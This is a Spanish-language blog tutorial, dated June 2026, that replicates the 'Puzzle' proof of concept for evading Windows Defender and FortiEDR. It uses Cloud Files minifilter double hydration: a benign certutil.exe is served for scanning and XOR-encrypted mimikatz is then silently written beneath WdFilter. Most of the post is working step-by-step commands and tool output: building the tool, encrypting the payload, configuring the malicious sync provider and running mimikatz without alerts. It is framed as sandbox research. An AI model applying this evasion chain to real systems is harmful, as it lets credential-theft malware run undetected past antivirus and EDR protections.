---
layout: single
title: "Replicando Puzzle: evasión completa de EDR con Cloud Files y minifilters"
date: 2026-06-22
categories: [malware, tutoriales]
tags: [edr-evasion, windows-kernel, minifilter, cldflt, bindflt, cloud-files, mimikatz, flare-vm, poc, rust, fortiedr]
excerpt: "Replicación paso a paso del PoC de Kurosh Dabbagh (@kudaes) presentado en EuskalHack IX: doble hidratación via Cloud Files API para escribir malware en disco sin que el AV lo escanee. Mimikatz ejecutándose con Windows Defender y FortiEDR activos."
permalink: /malware/puzzle-poc-edr-evasion-minifilters/
header:
  og_image: /assets/images/og-preview.png
---

Este post documenta la replicación del PoC [Puzzle](https://github.com/Kudaes/Puzzle) de Kurosh Dabbagh ([@kudaes](https://github.com/kudaes)), presentado en [EuskalHack IX](/conference/euskalhack-ix-minifilters-kernel/) en junio de 2026. El objetivo es entender la técnica a nivel práctico reproduciéndola en un entorno controlado con Windows Defender activo.

Para el contexto teórico completo (arquitectura de minifilters, Cloud Files API, FRN, bindflt) ver el [post de la charla](/conference/euskalhack-ix-minifilters-kernel/).

## Entorno

- **Sandbox:** FLARE-VM (Windows 10/11)
- **Rust:** 1.96.0 / Cargo 1.96.0
- **Windows Defender:** activo durante todo el proceso
- **Repo:** [github.com/Kudaes/Puzzle](https://github.com/Kudaes/Puzzle)

---

## Paso 1 — Instalar Rust

Puzzle está escrito en Rust. Si no está instalado, desde PowerShell:

```powershell
Invoke-WebRequest -Uri https://win.rustup.rs -OutFile rustup-init.exe
.\rustup-init.exe   # opción 1 (default)
```

También necesita **Visual Studio Build Tools** con el componente "Desktop development with C++". El instalador de Rust lo pedirá automáticamente si no están presentes.

Verificación:

```
PS C:\Windows\system32> rustc.exe --version
rustc 1.96.0 (ac68faa20 2026-05-25)

PS C:\Windows\system32> cargo.exe --version
cargo 1.96.0 (30a34c682 2026-05-25)
```

---

## Paso 2 — Descargar y compilar Puzzle

Descargar el repo como ZIP desde GitHub y extraer, o clonar con git:

```powershell
git clone https://github.com/Kudaes/Puzzle
cd Puzzle
```

Compilar todos los binarios en modo release:

```powershell
build.cmd build release
```

`build.cmd` invoca `cargo build --release` sobre cada subcrate del repo. Los binarios compilados quedan en `.\bin\`:

```
PS C:\Users\Ramon\Downloads\Puzzle-main\bin> ls

Mode    Length  Name
----    ------  ----
-a----  200192  bindlinks.exe      ← crea bindlinks (requiere Admin)
-a----  291840  id_mapper.exe      ← ejecuta por FRN sin ruta visible
-a----  260096  sync_provider.exe  ← registra el Cloud Files provider malicioso
-a----  220160  utils.exe
-a----  226816  wof_provider.exe   ← alternativa con WIM (requiere Admin)
```

---

## Paso 3 — Verificar minifilters

Antes de nada, confirmar que los tres minifilters necesarios están cargados:

```powershell
fltmc
```

```
Nombre de filtro    Altitud    Trama
-----------         --------   -----
bindflt             409800     0     ← por encima de todo
WdFilter            328010     0     ← Windows Defender
storqosflt          244000     0
wcifs               189900     0
CldFlt              180451     0     ← Cloud Files (clave del ataque)
FileCrypt           141100     0
luafv               135000     0
npsvctrig            46000     0
Wof                  40700     0
FileInfo             40500     0
```

Lo relevante:

```
bindflt    409800   ← intercepta antes que Defender
WdFilter   328010   ← Defender escanea a esta altitud
CldFlt     180451   ← escribe por DEBAJO de Defender → no visible para WdFilter
```

Los tres están presentes. El sistema es compatible.

---

## Paso 4 — Localizar el payload

Para que la demo sea real, el payload tiene que ser algo que Defender detectaría normalmente. En FLARE-VM, mimikatz estaba disponible en Downloads:

```
C:\Users\Ramon\Downloads\mimikatz_trunk\x64\mimikatz.exe   (1.355.264 bytes)
```

---

## Paso 5 — Cifrar el payload

El sync provider acepta el payload cifrado con XOR. El script `Scripts/xor_file.py` del repo hace el cifrado. Esto es necesario porque el archivo cifrado (bytes XOR aleatorios, sin firma PE) es indetectable para Defender:

```powershell
python C:\Users\Ramon\Downloads\Puzzle-main\Scripts\xor_file.py `
  C:\Users\Ramon\Downloads\mimikatz_trunk\x64\mimikatz.exe `
  test1234 `
  C:\Temp\mimi.enc.bin
```

Sintaxis del script: `xor_file.py <input> <key> <output>`.

El archivo resultante (`mimi.enc.bin`) tiene el mismo tamaño que el original (1.355.264 bytes) pero sin ninguna estructura PE reconocible — Defender no puede detectarlo.

> **En un ataque real** este paso lo hace el atacante en su propia máquina. El `.enc.bin` se sirve desde un share SMB remoto. La víctima nunca tiene el binario en claro en disco.

---

## Paso 6 — Registrar el sync provider malicioso

Crear el directorio de trabajo:

```powershell
mkdir C:\Temp\test
```

Lanzar el sync provider (no requiere Admin):

```powershell
cd C:\Users\Ramon\Downloads\Puzzle-main\bin
.\sync_provider.exe
```

El binario pide 6 inputs interactivos:

```
Sync root directory:                  C:\Temp\test
Backing file 1 (benign file):         C:\Windows\System32\certutil.exe
Backing file 2 (payload):             C:\Temp\mimi.enc.bin
Placeholder name:                     notmimi.exe
Decryption key (empty = unencrypted): test1234
Select mode (1 or 2):                 2
```

**Backing file 1** es el fichero legítimo que el provider entregará en la primera hidratación (el que Defender va a escanear y aprobar). Debe tener tamaño ≥ al del payload.

**Backing file 2** es el payload cifrado. El provider lo descifrará en memoria antes de la segunda hidratación.

**Mode 2** activa la doble hidratación: primero entrega goodware, luego reemplaza proactivamente con el malware en background. Mode 1 es hidratación simple sin evasión.

Output:

```
[+] Sync root sucessfully registered.
[+] Connection to sync root established. Connection key: 0x270044af320
[+] Placeholder created: C:\Temp\test\notmimi.exe
[+] Provider status set to CF_PROVIDER_STATUS_IDLE.
-----------------------------------------------------
[**] Select an option [**]
1) Dehydrate Placeholder
2) Unsync and Exit
>
```

El provider queda en espera. **Dejar esta ventana abierta.**

---

## Paso 7 — Primera ejecución (Defender escanea certutil)

En una segunda ventana PowerShell:

```powershell
C:\Temp\test\notmimi.exe
```

El provider registra la hidratación:

```
[-] Fetch Data operation received:
[-] Required offset: 0
[-] Required length: 1700864
[-] Bytes to send: 1700864          ← entrega certutil.exe (1.7 MB)
[-] Process command line: '"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"' --- PID: 3656
[-] Waiting 10 seconds before second hydration...
[-] Starting second rehydration!    ← escribe mimikatz sin que Defender lo vea
[+] Process completed!
```

Lo que ocurre internamente:

1. `NtCreateSection` sobre el placeholder → `IRP_MJ_ACQUIRE_FOR_SECTION_SYNCHRONIZATION`
2. **Defender** intercepta primero (altitud 328010) y pide hidratación completa para escanear
3. `CldFlt` pide el contenido al sync provider → provider entrega `certutil.exe`
4. Defender escanea certutil → limpio ✓ → el proceso se lanza (certutil)
5. Diez segundos después, el provider **proactivamente** hace la segunda hidratación: descifra `mimi.enc.bin` en memoria y llama a `FltWriteFileEx`
6. `FltWriteFileEx` escribe mimikatz a disco **sin propagarlo hacia instancias de altitud superior** → WdFilter (328010 > 180451) no recibe la escritura → Defender no ve mimikatz en ningún momento

---

## Paso 8 — Confirmar el contenido en disco y segunda ejecución

Después de la segunda hidratación, `notmimi.exe` contiene mimikatz. Para confirmarlo y forzar que Windows descarte el caché del contenido anterior:

Clic derecho sobre `C:\Temp\test\notmimi.exe` → Propiedades → OK.

{% include figure image_path="/assets/images/puzzle-poc-win.png" caption="Properties de notmimi.exe: 1.355.264 bytes — el tamaño exacto de mimikatz.exe. Defender no generó ninguna alerta." %}

El tamaño confirma que mimikatz está en disco: certutil.exe pesa ~1,7 MB, mimikatz pesa exactamente 1.355.264 bytes.

Segunda ejecución:

```powershell
C:\Temp\test\notmimi.exe
```

Se abre la ventana de mimikatz. **Windows Defender no genera ninguna alerta.**

### Resultado con FortiEDR

La técnica fue probada también en una máquina con **FortiEDR activo** ("FortiEDRProtección HABILITADA" visible en la bandeja del sistema). Resultado idéntico:

{% include figure image_path="/assets/images/puzzle-poc-fortiedr.jpg" caption="Mimikatz 2.2.0 x64 ejecutándose con FortiEDR habilitado. El comando 'coffee' confirma ejecución completa. Sin alertas del EDR." %}

Mimikatz ejecuta `coffee` sin ninguna intervención del EDR. Esto confirma lo que Dabbagh documentó en la charla: *"This same behavior has also been detected in numerous EDRs"* — la evasión no es específica de Windows Defender, sino que afecta a EDRs comerciales que confían en la ausencia de modificaciones en USN Journal y MFT para decidir si re-analizar un binario.

---

## Por qué el AV no detecta la segunda ejecución

En la segunda ejecución, Defender consulta:

```
USN Journal      → sin cambios registrados desde el último escaneo
MFT metadata     → sin modificación de timestamps
Conclusión:      → "el fichero no ha cambiado, ya lo aprobé" → ejecuta sin re-análisis
```

`CldFlt` no registra las escrituras realizadas con `FltWriteFileEx` + `FLTFL_IO_OPERATION_PAGING` en el USN Journal ni en los metadatos del MFT. Desde el punto de vista de Defender, el fichero es el mismo certutil.exe que aprobó en el escaneo anterior.

---

## Paso 9 — Limpieza

En la consola del sync provider:

```
1   → Dehydrate Placeholder
2   → Unsync and Exit
```

```powershell
Remove-Item C:\Temp\test -Recurse -Force
Remove-Item C:\Temp\mimi.enc.bin
```

---

## Resumen del flujo completo

```
[Atacante - máquina propia]
mimikatz.exe → xor_file.py → mimi.enc.bin
                              ↓ (SMB / disco)
[Víctima - Defender activo]
sync_provider.exe registrado como Cloud Files provider
placeholder notmimi.exe creado en C:\Temp\test\

Primera ejecución de notmimi.exe:
  → Defender pide hidratación
  → provider entrega certutil.exe → Defender: limpio ✓
  → (background) provider escribe mimikatz via FltWriteFileEx
     por debajo de WdFilter → Defender no lo ve
     USN Journal no registra la escritura

Segunda ejecución de notmimi.exe:
  → Defender: "sin cambios desde el último escaneo" → no re-analiza
  → mimikatz.exe ejecutándose ✓
  → Windows Defender: sin alertas ✓
```

---

## Referencias

- [EuskalHack IX — Minifilters: Owning the High (and Low) Ground](/conference/euskalhack-ix-minifilters-kernel/) — análisis técnico de la charla de Dabbagh
- [Puzzle — github.com/Kudaes/Puzzle](https://github.com/Kudaes/Puzzle) — repositorio de Kurosh Dabbagh (@kudaes)
- [Cloud Filter API — Microsoft Docs](https://learn.microsoft.com/en-us/windows/win32/api/_cloudapi/)
- [FltWriteFileEx — Microsoft Docs](https://learn.microsoft.com/es-es/windows-hardware/drivers/ddi/fltkernel/nf-fltkernel-fltwritefileex)
- [Load order groups and altitudes — Microsoft Docs](https://learn.microsoft.com/es-es/windows-hardware/drivers/ifs/load-order-groups-and-altitudes-for-minifilter-drivers)
